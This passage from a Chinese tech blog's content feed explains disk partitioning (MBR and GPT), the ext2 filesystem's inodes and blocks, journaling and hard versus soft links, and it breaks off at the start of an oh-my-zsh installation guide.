width="300"/></p><ul><li>磁头：磁头是硬盘中对盘片进行读写工作的工具，是硬盘中最精密的部位之一。硬盘的磁头是用线圈缠绕在磁芯上制成的，最初的磁头是读写合一的，通过电流变化去感应信号的幅度。</li><li>磁道：<strong>当磁盘旋转时,磁头若保持在一个位置上,则每个磁头都会在磁盘表面划出一个圆形轨迹,这些圆形轨迹就叫做磁道</strong>。这些磁道用肉眼是根本看不到的,因为它们仅是盘面上以特殊方式磁化了的一些磁化区,磁盘上的信息便是沿着这样的轨道存放的。相邻磁道之间并不是紧挨着的,这是因为磁化单元相隔太近时磁性会相互产生影响,同时也为磁头的读写带来困难。</li><li>扇区：磁盘上的每个磁道被等分为若干个弧段,这些<strong>弧段便是磁盘的扇区</strong>。</li><li>柱面：<strong>硬盘通常由重叠的一组盘片构成,每个盘面都被划分为数目相等的磁道,并从外缘的“0”开始编号,具有相同编号的磁道形成一个圆柱,称之为磁盘的柱面。</strong></li><li>簇：“簇”是 DOS 进行分配的最小单位。当创建一个很小的文件时,如是一个字节,则它在磁盘上并不是只占一个字节的空间,而是占有整个一簇。DOS 视不同的存储介质(如软盘,硬盘),不同容量的硬盘,簇的大小也不一样。簇的大小可在称为磁盘参数块(BPB)中获取。簇的概念仅适用于数据区。</li></ul><p>i&gt; tips：每个盘片都有两面，两面都可以存数据。</p><p>一般来说，我们要进行分区，其实就是<strong>规划柱面的范围</strong>，柱面是分区的最小单位（最新的GPT也可用扇区作为最小分区单位）。比如100-200柱面是分区1,200-400柱面是分区2。</p><h2 id="2-MBR分区表"><a href="#2-MBR分区表" class="headerlink" title="2. MBR分区表"></a>2. MBR分区表</h2><p>MBR这个概念首次出现，是在1983年的IBM PC DOS 2.0操作系统当中，因此也被称为DOS分区结构。实际上，MBR分区结构是一种应用非常广泛的硬盘分区结构，不仅仅是DOS，包括windows系列操作系统、Linux以及基于X86架构的UNIX操作系统等平台均有使用。</p><p>MBR的英文全称是Main Boot Record（一说Master Boot Record），翻译过来的中文名称是主引导记录。</p><p><strong>它主要有以下几个特点：</strong></p><p>1、在我们常见的电脑中，一般是BIOS+MBR、(U)efi+GPT的组合；</p><p>2、MBR分区表中单个分区最大仅支持2TB，而整个分区表最大也是仅支持2TB的硬盘；</p><p>3、MBR分区表最大只支持四个主分区（可少不可多），如果觉得四个不够用，可以使用三个主分区+一个扩展分区的组合（扩展分区仅能存在一个，但扩展分区下可以分出无数个逻辑分区）；</p><p><img data-src="https://ae01.alicdn.com/kf/H6a919019923c4603a9f71c83fb9fb52bM.jpg"></p><p>可能有朋友对主分区、扩展分区、逻辑分区的概念有点懵逼，这里再说一下：</p><ul><li>主要分区与延伸分区最多可以有四笔（硬盘的限制）</li><li><strong>延伸分区最多只能有一个</strong>（操作系统的限制）</li><li>逻辑分区是由延伸分区持续切割出来的分区；</li><li><strong>能够被格式化后，作为数据存取的分区为主要分区与逻辑分区。延伸分区无法格式化</strong>；</li><li>逻辑分区的数量依操作系统而不同，在Linux系统中SATA硬盘已经可以突破63个以上的分区限制； </li></ul><p>i&gt; tips: 假设上面的硬盘设备文件名为/dev/sda：</p><ul><li>对于四个分区都是主分区时，其命名为/dev/sda1,/dev/sda2,/dev/sda3,/dev/sda4。</li><li>对于三个主分区+一个扩展分区（扩展分区又分出了3个逻辑分区），其命名为/dev/sda1,/dev/sda2,/dev/sda3,<strong>/dev/sda5,/dev/sda6,/dev/sda7。</strong>注意没有/dev/sda4，因为该命名仅给主分区使用。</li></ul><p>MBR分区表占用一个扇区，这个扇区中有三种数据：</p><ul><li>主要开机记录区（Master Boot Record, MBR）：可以<strong>安装开机管理程序</strong>的地方，有<strong>446 Bytes</strong> </li><li>分区表（partition table）：<strong>记录整颗硬盘分区的状态，有64 Bytes</strong> </li><li>主引导记录签名：2Bytes</li></ul><p>详细信息可参见下图。</p><p><img data-src="https://ae01.alicdn.com/kf/Hf27869b886d14f14afb707d117d41cc4X.jpg"></p><p>i&gt; 上图也说明了为什么MBR分区格式最大只支持2TB的数据。</p><p>借助鸟哥书中的一个例题，我们来加深一下MBR中的分区表的概念及特点：</p><p>√&gt; 在Windows操作系统当中，如果你想要将D与E盘整合成为一个新的分区，而如果有两种分区的情况如下图所示， 图中的特殊颜色区块为D与E盘的示意，请问这两种方式是否均可将D与E整合成为一个新的分区？ </p><p><img data-src="https://ae01.alicdn.com/kf/H3c7e85f849a54a18adcdeae56ed082801.jpg"></p><p>答：</p><ol><li>上图可以整合：因为上图的D与E同属于延伸分区内的逻辑分区，因此只要将两个分区删除，然后再重新创建一个新的分区， 就能够在不影响其他分区的情况下，将两个分区的容量整合成为一个 。</li><li>下图不可整合：因为D与E分属主分区与逻辑分区，两者不能够整合在一起。除非将延伸分区破坏掉后再重新分区。 但如此一来会影响到所有的逻辑分区，要注意的是<strong>：如果延伸分区被破坏，所有逻辑分区将会被删除。</strong> 因为逻辑分区的信息都记录在延伸分区里面嘛 。</li></ol><h2 id="3-GPT（GUID-partition-table"><a href="#3-GPT（GUID-partition-table" class="headerlink" title="3. GPT（GUID partition table )"></a>3. GPT（GUID partition table )</h2><p>因为过去一个扇区大小就是 512Bytes 而已，不过目前已经有 4K 的扇区设计出现！为了相容于所有的磁盘，因此在扇区的定义上面，大多会使用所谓的逻辑区块位址（Logical Block Address, LBA）来处理。GPT 将磁盘所有区块以此 LBA（默认为 512Bytes 喔！） 来规划，而第一个 LBA 称为 LBA0 （从 0 开始编号）。 </p><p><strong>说白了就是用LBA来统一不同大小的扇区。</strong></p><p>与 MBR 仅使用第一个 512Bytes 区块来纪录不同， GPT 使用了 34 个 LBA 区块来纪录分区信息 ，除了前面 34 个 LBA 之外，整个磁盘的最后 34个 LBA 也拿来作为另一个备份 。详细的结构如下图：</p><p><img data-src="https://ae01.alicdn.com/kf/Hce86538a27294788b5ccf384496cf4ae0.jpg"></p><h4 id="3-1-LBA0（MBR-相容区块）"><a href="#3-1-LBA0（MBR-相容区块）" class="headerlink" title="3.1 LBA0（MBR 相容区块）"></a>3.1 LBA0（MBR 相容区块）</h4><p>与 MBR 模式相似的，这个相容区块也分为两个部份，一个就是跟之前 446 Bytes 相似的区块，储存了第一阶段的开机管理程序！而<strong>在原本的分区表的纪录区内，这个相容模式仅放入一个特殊标志的分区</strong>，用来表示此磁盘为 GPT 格式之意。而不懂 GPT 分区表的磁盘管理程序， 就不会认识这颗磁盘 。从而<strong>防止那些不识别GPT的磁盘管理工具破坏整个GPT磁盘的信息。</strong></p><h4 id="3-2-LBA1-（GPT-表头纪录）"><a href="#3-2-LBA1-（GPT-表头纪录）" class="headerlink" title="3.2 LBA1 （GPT 表头纪录）"></a>3.2 LBA1 （GPT 表头纪录）</h4><p>这个部份纪录了分区表本身的位置与大小，同时纪录了备份用的 GPT 分区 （就是前面谈到的在最后 34个 LBA 区块） 放置的位置， 同时放置了分区表的<strong>检验机制码 （CRC32），操作系统可以根据这个检验码来判断 GPT 是否正确</strong>。若有错误，还可以通过这个纪录区来取得备份的 GPT（磁盘最后的那个备份区块） 来恢复 GPT 的正常运行！ </p><h4 id="3-3-LBA2-33-（实际纪录分区信息处）"><a href="#3-3-LBA2-33-（实际纪录分区信息处）" class="headerlink" title="3.3 LBA2-33 （实际纪录分区信息处）"></a>3.3 LBA2-33 （实际纪录分区信息处）</h4><p>从 LBA2 区块开始，<strong>每个 LBA 都可以纪录 4 笔分区纪录</strong>，所以在默认的情况下，总共可以有 4<em>32 = 128 笔分区纪录喔！因为每个 LBA 有 512Bytes，因此每笔纪录用到 128 Bytes 的空间，除了每笔纪录所需要的识别码与相关的纪录之外，GPT 在每笔纪录中分别提供了 <strong>64bits 来记载开始/结束的扇区号码，</strong>因此，GPT 分区表对于单一分区来说， 他的最大容量限制就会在“ 264 * 512Bytes = 263 *1KBytes = 233\</em>TB = 8 ZB ”，要注意 1ZB = 230TB 啦！ </p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>鸟哥的linux的私房菜</li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h5eTU4MDE5NjUvYXJ0aWNsZS9kZXRhaWxzLzUxMTM2Mzk1" title="https://blog.csdn.net/hyy5801965/article/details/51136395">MBR为什么最大只能用2TB<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW9taW50aGVyZS9hcnRpY2xlL2RldGFpbHMvMTk3NTY1NTE=" title="https://blog.csdn.net/xiaominthere/article/details/19756551">硬盘概念：扇区，磁道，磁头，柱面，簇<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cudGlueTc3Ny5jb20vMTcwODA4TUJSLw==" title="https://www.tiny777.com/170808MBR/">MBR分区表<i class="fa fa-external-link"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件系统 </tag>
            
            <tag> 分区表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux文件系统基础知识</title>
      <link href="/archives/8d404d4a.html"/>
      <url>/archives/8d404d4a.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux文件系统基础知识"><a href="#Linux文件系统基础知识" class="headerlink" title="Linux文件系统基础知识"></a>Linux文件系统基础知识</h1><p>Linux文件系统基础知识</p><p>本文整理自《鸟哥的Linux私房菜-基础学习篇》</p><p>我们都知道，在Linux下，文件除了文件本身的数据外，还有非常多的其他属性（如文件的权限，所属者，时间参数等等）。Linux文件系统是如何实现它们的呢？</p><a id="more"></a><h2 id="1-Linux文件系统特性"><a href="#1-Linux文件系统特性" class="headerlink" title="1. Linux文件系统特性"></a>1. Linux文件系统特性</h2><p>文件系统通常会将这两部分的数据分别存放在不同的区块中，<strong>权限与属性放置到 inode 中，至于实际数据则放置到 data block 区块中 **，除此之外，还有一个</strong>超级区块 （superblock） 会记录整个文件系统的整体信息**，包括 inode 与 block 的总量、使用量、剩余量等。 </p><p>i&gt; tips: 通过dumpe2fs + 设备名 查看文件系统的信息。如 dumpe2fs /dev/sda1</p><p>每个 inode 与 block 都有编号，至于这三个数据的意义可以简略说明如下： </p><ul><li>superblock：记录此 filesystem 的整体信息，包括inode/block的总量、使用量、剩余量， 以及文件系统的格式与相关信息等；</li><li>inode：记录文件的属性，<strong>一个文件占用一个inode</strong>，同时记录此文件的数据所在的 block 号码；</li><li>block：实际记录文件的内容，若<strong>文件太大时，会占用多个 block</strong> 。 </li></ul><p>我们将inode和block的存储方式用图来说明一下：</p><p><img data-src="https://ae01.alicdn.com/kf/H4825a8de043640cd9ce3822519fac15fu.jpg"></p><p>上图的灰色区块表示的是inode区块，蓝青色（是这个色？？？）区块表示的是block区块。4号inode区块将存储文件的属性及权限信息，同时还包含了实际存储文件内容的block编号。通过读取inode，我们可以一次性将所有block编号得到，操作系统就能够据此来排列磁盘的读取顺序，可以一口气将四个 block 内容读出来 ！</p><p>i&gt; tips: inode+block的这种存储方式被称为索引式文件系统。</p><p>为说明inode+block的这种方式的优势，我们拿FAT为例进行对比。它的存储方式如下图：</p><p><img data-src="https://ae01.alicdn.com/kf/H0b2edc6c293d4c03b19f4d46da34796c2.jpg"></p><p>FAT是无法将这个文件的所有block一开始就读取出来的，它更像是一个链表，只要读到一块才能知道下一块在哪里。这样的致命缺点是，当数据在磁盘上分布得过于分散时，磁盘将多转几圈才能完整的读取到这个文件的内容。</p><p>i&gt; tips: 要解决FAT由于数据分布过散而导致的性能降低问题，我们常常会使用“磁盘重组“技术，通过重组将同一个文件所属的 blocks 汇整在一起，这样数据的读取会比较容易啊！ </p><h2 id="2-Linux-的-EXT2-文件系统（inode）"><a href="#2-Linux-的-EXT2-文件系统（inode）" class="headerlink" title="2. Linux 的 EXT2 文件系统（inode）"></a>2. Linux 的 EXT2 文件系统（inode）</h2><p>如同前一小节所说的，inode 的内容在记录文件的权限与相关属性，至于 block 区块则是在记录文件的实际内容。 而且<strong>文件系统一开始就将 inode 与 block 规划好了，除非重新格式化（或者利用 resize2fs 等指令变更文件系统大小），否则 inode 与 block 固定后就不再变动</strong>。但是如果仔细考虑一下，如果我的文件系统高达数百GB时， 那么将所有的 inode 与 block 通通放置在一起将是很不智的决定，因为 inode 与block 的数量太庞大，不容易管理 。所以<strong>Ext2采用了多个区块群组 （block group ）</strong>来进行管理。如下图：</p><p><img data-src="https://ae01.alicdn.com/kf/H4bcc6986edde488e9f4d687613bdaad31.jpg"></p><p>每个区块群组都有独立的inode/block/superblock 系统。 </p><ul><li>文件系统的最开始Boot Sector（开机山区）其实和我们存储数据没多大关系，但是这个开机扇区可以安装开机管理程序，这样我们就可以将不同的开机管理程序安装到个别的文件系统了。这样不用覆盖整个磁盘唯一的MBR，才能制作<strong>多重开机环境</strong>啊。</li></ul><p>现在我们再来详细的解释每个区群里面的内容。</p><h3 id="2-1-data-block-（数据区块）"><a href="#2-1-data-block-（数据区块）" class="headerlink" title="2.1 data block （数据区块）"></a>2.1 data block （数据区块）</h3><p>data block 是用来放置文件内容数据地方，在 Ext2 文件系统中所支持的 block 大小有 1K, 2K 及 4K 三种 ，在格式化时 block 的大小就固定了，且每个 block 都有编号，以方便 inode 的记录。由于 block 大小的差异，会导致该文件系统能够支持的最大磁盘容量与最大单一文件大小并不相同。 因为 block 大小而产生的 Ext2 文件系统限制如下 ：</p><table><thead><tr><th align="center">Block 大小</th><th align="center">1KB</th><th align="center">2KB</th><th align="center">4KB</th></tr></thead><tbody><tr><td align="center">最大单一文件限制</td><td align="center">16GB</td><td align="center">256GB</td><td align="center">2TB</td></tr><tr><td align="center">最大文件系统总容量</td><td align="center">2TB</td><td align="center">8TB</td><td align="center">16TB</td></tr></tbody></table><p>至于为什么会出现这样的现象，得在了解了inode结构之后才能解释。</p><p>除此之外 Ext2 文件系统的 block 还有什么限制呢？有的！基本限制如下：</p><ul><li>原则上，block 的大小与数量在格式化完就不能够再改变了（除非重新格式化）；</li><li>每个 block 内最多只能够放置一个文件的数据；</li><li>承上，如果文件大于 block 的大小，则一个文件会占用多个 block 数量；</li><li>承上，若文件小于 block ，则该 block 的剩余容量就不能够再被使用了（磁盘空间会浪费）。 </li></ul><h3 id="2-2-inode-table（inode表）"><a href="#2-2-inode-table（inode表）" class="headerlink" title="2.2 inode table（inode表）"></a>2.2 inode table（inode表）</h3><p>现在来谈谈inode吧。它记录了文件的属性以及实际存储文件的block的编号。特性包含以下几点：</p><ul><li>每个 inode 大小均固定为 <strong>128 Bytes</strong> （新的 ext4 与 xfs 可设置到 256 Bytes）；</li><li>每个文件都仅会占用一个 inode 而已；</li><li>承上，因此文件系统能够创建的文件数量与 inode 的数量有关；</li><li>系统读取文件时需要先找到 inode，并分析 inode 所记录的权限与使用者是否符合，若符合才能够开始实际读取 block 的内容。 </li></ul><p>细心的读者应该有注意到inode大小仅有128字节，这么点大小却要存放相当多的内容。我们来简单的举个例子说明一下：假设存放一个block需要4字节的大小，现有一个400M的文件，并假定文件系统格式化时指定的block大小为4k，那我们需要十万笔block编号才能存储这样文件！</p><p>好在Ext2的设计者们早就想到了解决办法，很聪明的将 inode 记录 block 号码的区域定义为12个直接，一个间接, 一个双间接与一个三间接记录区 。结构可见下图：</p><p><img data-src="https://ae01.alicdn.com/kf/H34a635582d244422afc1bbcd7c1619edS.jpg"></p><p>图最左边为 inode 本身 （128 Bytes），里面有 12 个直接指向 block 号码的对照，这 12 笔记录就能够直接取得 block 号码啦！ 至于所谓的间接就是再拿一个 block 来当作记录 block 号码的记录区，如果文件太大时， 就会使用间接的 block 来记录号码。如上图当中间接只是拿一个 block 来记录额外的号码而已。 同理，如果文件持续长大，那么就会利用所谓的双间接，第一个 block 仅再指出下一个记录号码的 block 在哪里， 实际记录的在第二个 block 当中。依此类推，三间接就是利用第三层 block 来记录号码啦！ </p><p>i&gt; 这像不像多级页表呢？</p><p>好了，看到这里，我们就可以解释为什么不同block的大小会导致最大单一文件限制以及最大文件系统限制了</p><p>以Block大小为1KB为例，我们来计算一波：</p><ul><li>12个直接记录： 12*1K = 12K</li><li>一级间接记录：在inode中每个block编号项需要4Bytes，那么1个间接记录block为1K，则有1K/4Bytes项Block编号，最后乘上Block大小即可。也就是：1K/4Bytes x 1K = 256 K</li><li>二级间接记录：同上解释，256 x 256  x 1K =$ 256^2 $K</li><li>三级间接记录：同上解释，256 x 256 x 256 x 1K =$ 256^3 $K</li></ul><p>所以将所有记录相加，可得：12 + 256 + 256<em>256 + 256</em>256*256 （K） = 16GB 。这就是为什么block size =1 K的时候，最大单一文件只能有16G了。</p><h3 id="2-3-Superblock-（超级区块）"><a href="#2-3-Superblock-（超级区块）" class="headerlink" title="2.3 Superblock （超级区块）"></a>2.3 Superblock （超级区块）</h3><p>Superblock 是记录整个 filesystem 相关信息的地方， 他记录的信息主要有： </p><ul><li>block 与 inode 的总量；</li><li>未使用与已使用的 inode / block 总数量；</li><li>block 与 inode 的大小 （block 为 1, 2, 4K，inode 为 128Bytes 或 256Bytes）；</li><li>filesystem 的挂载时间、最近一次写入数据的时间、最近一次检验磁盘 （fsck） 的时间等文件系统的相关信息；</li><li>一个 valid bit 数值，若此文件系统已被挂载，则 valid bit 为 0 ，若未被挂载，则 valid bit 为 1 。 </li></ul><p>x&gt; superblock记录的是文件系统的信息，如果 superblock 死掉了， 你的文件系统可能就坏掉咯。在第二节开头我们说过，<strong>每个区块群组都有独立的inode/block/superblock 系统。</strong> 这就有点矛盾了，因为superblock只用记录文件系统的信息。</p><p>事实上除了第一个 block group 内会含有 superblock 之外，后续的 block group 不一定含有 superblock ， 而若含有 superblock 则该 superblock主要是做为第一个 block group 内 superblock 的备份咯，这样可以进行 superblock 的救援呢！ </p><h3 id="2-4-Filesystem-Description-（文件系统描述说明）"><a href="#2-4-Filesystem-Description-（文件系统描述说明）" class="headerlink" title="2.4 Filesystem Description （文件系统描述说明）"></a>2.4 Filesystem Description （文件系统描述说明）</h3><p>这个区段可以描述每个 block group 的开始与结束的 block 号码 </p><h3 id="2-5-block-bitmap-（区块对照表）"><a href="#2-5-block-bitmap-（区块对照表）" class="headerlink" title="2.5 block bitmap （区块对照表）"></a>2.5 block bitmap （区块对照表）</h3><p>如果你想要新增文件时总会用到 block 吧！那你要使用哪个 block 来记录呢？当然是选择“空的 block ”来记录新文件的数据啰。 那你怎么知道哪个 block 是空的？这就得要通过 block bitmap 的辅助了。<strong>从 block bitmap 当中可以知道哪些 block 是空的</strong>，因此我们的系统就能够很快速的找到可使用的空间来处置文件啰。<br>同样的，如果你删除某些文件时，那么那些文件原本占用的 block 号码就得要释放出来， 此时在 block bitmap 当中相对应到该 block 号码的标志就得要修改成为“未使用中”啰！这就是 bitmap 的功能。 </p><h3 id="2-6-inode-bitmap-（inode-对照表）"><a href="#2-6-inode-bitmap-（inode-对照表）" class="headerlink" title="2. 6  inode bitmap （inode 对照表）"></a>2. 6  inode bitmap （inode 对照表）</h3><p>同block bitmap相似，inode bitmap 则是记录使用与未使用的 inode 号码啰！ </p><h2 id="3-inode-block与目录树的关系"><a href="#3-inode-block与目录树的关系" class="headerlink" title="3. inode+block与目录树的关系"></a>3. inode+block与目录树的关系</h2><h3 id="3-1-目录"><a href="#3-1-目录" class="headerlink" title="3.1 目录"></a>3.1 目录</h3><p>要知道目录树，首先得知道什么是目录。目录本质上也是一种文件（要知道linux一切皆文件，虽然网卡先生表示不服），当我们在 Linux 下的文件系统创建一个目录时，文件系统会分配一个 inode 与至少一块 block 给该目录。其中，inode 记录该目录的相关权限与属性，并可记录分配到的那块 block 号码； 而 block 则是记录在这个目录下的文件名与该文件名占用的 inode 号码数据。 目录存储信息结构可见下图：</p><p><img data-src="https://ae01.alicdn.com/kf/H5ff1bd2454f74431b10c7379cc782de4w.jpg"></p><p>i&gt; 查看inode信息，可使用 <code>ls -i</code>命令</p><h3 id="3-2-文件"><a href="#3-2-文件" class="headerlink" title="3.2 文件"></a>3.2 文件</h3><p>当我们在 Linux 下的 ext2 创建一个一般文件时， ext2 会分配一个 inode 与相对于该文件大小的 block 数量给该文件。 </p><h3 id="3-3-目录树读取"><a href="#3-3-目录树读取" class="headerlink" title="3.3 目录树读取"></a>3.3 目录树读取</h3><p>通过对目录的说明，你应该知道了文件本身并不存储文件名，文件名仅存放在目录之中，于是当我们通过文件名去访问一个文件时，就必然会经过目录，通过目录的文件名与文件inode的映射关系知道该文件的inode，再进行下一步的操作。现在我们以一个例子来对目录树读取进行说明。</p><p>执行<code>lll -di / /etc /etc/passwd </code>命名，系统会做哪些操作呢？</p><p><img data-src="https://ae01.alicdn.com/kf/H43da9f0121f1400da38ff9c885f11054y.jpg"></p><p>1./ 的 inode： </p><p>通过挂载点的信息找到 inode 号码为 128 的根目录 inode，且 inode 规范的权限让我们可以读取该 block 的内容（有与 x） ；</p><p>2./ 的 block： </p><p>经过上个步骤取得 block 的号码，并找到该内容有 etc/ 目录的 inode 号码 （33595521）； </p><p>3.etc/ 的 inode： </p><p>读取 33595521 号 inode 得知 dmtsai 具有 r 与 x 的权限，因此可以读取 etc/ 的 block 内容； </p><p>4.etc/ 的 block： </p><p>经过上个步骤取得 block 号码，并找到该内容有 passwd 文件的 inode 号码 （36628004）； </p><p>5.passwd 的 inode： </p><p>读取 36628004 号 inode 得知 dmtsai 具有 r 的权限，因此可以读取 passwd 的 block 内容； </p><p>6.passwd 的 block： </p><p>最后将该 block 内容的数据读出来。 </p><p>其实基本上就是：<strong>通过文件名找文件inode-&gt;比对inode信息，查看是否有权限访问-&gt;找到inode对应的block-&gt;反复</strong></p><h2 id="4-日志式文件系统"><a href="#4-日志式文件系统" class="headerlink" title="4. 日志式文件系统"></a>4. 日志式文件系统</h2><p>i&gt;  日志式文件系统是为了解决数据的不一致状态</p><h3 id="4-1-写入数据时的操作"><a href="#4-1-写入数据时的操作" class="headerlink" title="4.1 写入数据时的操作"></a>4.1 写入数据时的操作</h3><ol><li>先确定使用者对于欲新增文件的目录是否具有 w 与 x 的权限，若有的话才能新增；</li><li>根据 inode bitmap 找到没有使用的 inode 号码，并将新文件的权限/属性写入；</li><li>根据 block bitmap 找到没有使用中的 block 号码，并将实际的数据写入 block 中，且更新 inode 的 block 指向数据；</li><li>将刚刚写入的 inode 与 block 数据同步更新 inode bitmap 与 block bitmap，并更新 superblock 的内容。 </li></ol><h3 id="4-2-数据不一致状态"><a href="#4-2-数据不一致状态" class="headerlink" title="4.2 数据不一致状态"></a>4.2 数据不一致状态</h3><p>在一般正常的情况下，上述的新增动作当然可以顺利的完成。但是如果有个万一怎么办？ 例如你的文件在写入文件系统时，因为不知名原因导致系统中断（例如突然的停电啊、 系统核心发生错误啊～等等的怪事发生时），所以写入的数据仅有 inode table 及 data block 而已，最后一个同步更新中介数据的步骤并没有做完，此时就会发生 metadata 的内容与实际数据存放区产生不一致 （Inconsistent） 的情况了。 </p><h3 id="4-3-日志式文件系统-（Journaling-filesystem）"><a href="#4-3-日志式文件系统-（Journaling-filesystem）" class="headerlink" title="4.3 日志式文件系统 （Journaling filesystem）"></a>4.3 日志式文件系统 （Journaling filesystem）</h3><p>为了避免上述提到的文件系统不一致的情况发生，因此我们的前辈们想到一个方式， 如果在我们的 filesystem 当中规划出一个区块，该区块专门在记录写入或修订文件时的步骤， 那不就可以简化一致性检查的步骤了？也就是说： </p><ol><li>预备：当系统要写入一个文件时，会先在日志记录区块中纪录某个文件准备要写入的信息；</li><li>实际写入：开始写入文件的权限与数据；开始更新 metadata 的数据；</li><li>结束：完成数据与 metadata 的更新后，在日志记录区块当中完成该文件的纪录。 </li></ol>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux中硬链与软链详解</title>
      <link href="/archives/f81072e7.html"/>
      <url>/archives/f81072e7.html</url>
      
        <content type="html"><![CDATA[<p>本文整理自《鸟哥的Linux私房菜-基础学习篇》</p><h2 id="1-软链"><a href="#1-软链" class="headerlink" title="1. 软链"></a>1. 软链</h2><p>创建软链接的方式如下：</p><a id="more"></a><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s target link</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img data-src="https://ae01.alicdn.com/kf/H054a6971f4034628a0f83302edc2a6622.jpg"></p><p>软链和Windows的“快捷方式”完全等同。通过软链接我们可以间接访问到源文件，软链接是一个单独的文件，是和源文件完全不同的文件。如何证明这点呢？了解Linux文件系统的朋友肯定知道，在同一个文件系统中，一个文件对应其唯一的inode编号。于是我们只用查看两个文件的inode编号是否相同就知道两个文件是否为同一个文件啦。具体方式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ll -i</span><br></pre></td></tr></table></figure><p><img data-src="https://ae01.alicdn.com/kf/H7970b24cd4184755afdaafc9a2d901fbW.jpg"></p><p>第一列即为inode编号，可以到file1和file1_sl两者的inode编号不同，所以两个是不同的文件。</p><p>软链文件中存储的内容就是源文件的真实路径，软链接的大小对应源文件的路径长度，如这里软链接为5个字节，对应file1这5个字符，其工作原理如下图：</p><p><img data-src="https://ae01.alicdn.com/kf/H11bbe0318b2d479eb0ea67cf2bd4d7d5c.jpg"></p><h2 id="2-硬链"><a href="#2-硬链" class="headerlink" title="2. 硬链"></a>2. 硬链</h2><p>我们知道，要访问一个文件，我们首先在目录中根据文件名找到文件的inode，再根据inode找到实际存储文件内容的block，如下图：<br><img data-src="https://ae01.alicdn.com/kf/Hbf84015e9ed24e1783e33f14c2b0643bb.jpg"></p><p>可以通过如下命令创建一个硬链接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln target link</span><br></pre></td></tr></table></figure><p>效果如下图：</p><p><img data-src="https://ae01.alicdn.com/kf/H560e005fb5c641258b7e9644b31bc3e7o.jpg"></p><p>我们要关注的有两点：</p><ol><li><p>通过<code>ll -i</code>命令，我们发现file1和file1_hl的inode是完全相同的，这说明<strong>两者是完全一样的文件</strong>。我们对其中一个文件名对文件进行写操作，通过另一个文件名也能知道写操作的效果，如下图。</p><p><img data-src="https://ae01.alicdn.com/kf/H9649cfad4c204f00a991bd45bbdf6f29N.jpg"></p></li><li><p>可以观察看到<code> ll -i</code>打印出来的第三列由1变为了2，这一列的意义是“有多少文件硬链接到本文件”，因为增加了file1_hl这个硬链接，所以file1的第三列变为2，反之file1也是硬链接到file1_hl上的，所以file1_hl也为2。</p></li></ol><p>硬链的原理可见下图：</p><p><img data-src="https://ae01.alicdn.com/kf/He3d79d5c5d5e468e8bceda57cac32aefU.jpg"></p><p>在<a href="https://www.ravenxrz.ink/archives/basic-knowledge-of-linux-file-system-1.html">Linux文件系统基础篇</a>我们曾介绍过，inode和block是依托文件系统的，也就是说不同文件系统的相同inode是不同的文件。这个特点<strong>决定了硬链只能在同一文件系统内使用</strong>。除此之外，硬链也<strong>不能链接目录</strong>，原因在于：如果使用 hard link 链接到目录时， 链接的数据需要连同被链接目录下面的所有数据都创建链接，举例来说，如果你要将 /etc 使用实体链接创建一个 /etc_hd 的目录时，那么在 /etc_hd 下面的所有文件名同时都与 /etc 下面的文件名要创建 hard link 的，而不是仅链接到 /etc_hd 与 /etc 而已。 并且，未来如果需要在 /etc_hd 下面创建新文件时，连带的， /etc 下面的数据又得要创建一次 hard link ，因此造成环境相当大的复杂度。</p><p>总结来看，硬链的特点包括：</p><ul><li>不能跨文件系统</li><li>不能链接目录</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>鸟哥的Linux私房菜</li><li><span class="exturl" data-url="aHR0cDovL3d3dy5zaGFvZ3VvamkuY24vMjAxOC8wMS8yOC9saW51eC1oYXJkLXNvZnQtbGluay8=" title="http://www.shaoguoji.cn/2018/01/28/linux-hard-soft-link/">Linux 软链接与硬链接<i class="fa fa-external-link"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 硬链接 </tag>
            
            <tag> 软链接 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu下OhMyZsh的快速安装教程</title>
      <link href="/archives/6c55eca4.html"/>
      <url>/archives/6c55eca4.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>依旧是常用工具补坑，每次重装系统或者更换设备都要安装oh-my-zsh，然后每次都会去百度教程，所以这里简单记录一下。</p></blockquote><p>oh-my-zsh比起ubuntu自带的bash的优点，我这里就不细说了。<strong>反正只用知道使用on-my-zsh可以提高生产力就行了。</strong></p><a id="more"></a><h2 id="1-安装oh-my-zsh"><a href="#1-安装oh-my-zsh" class="headerlink" title="1. 安装oh-my-zsh"></a>1. 安装oh-my-zsh</h2><p>要使用on-my-zsh，首先得<strong>安装zsh，并把shell环境切换为zsh</strong>。</p><p>执行以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装 Zsh</span></span><br><span class="line">sudo apt install zsh</span><br><span class="line"><span class="meta">#</span><span class="bash"> 将 Zsh 设置为默认 Shell</span></span><br><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure><p>之后就可以<strong>安装oh-my-zsh了</strong>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装 Oh My 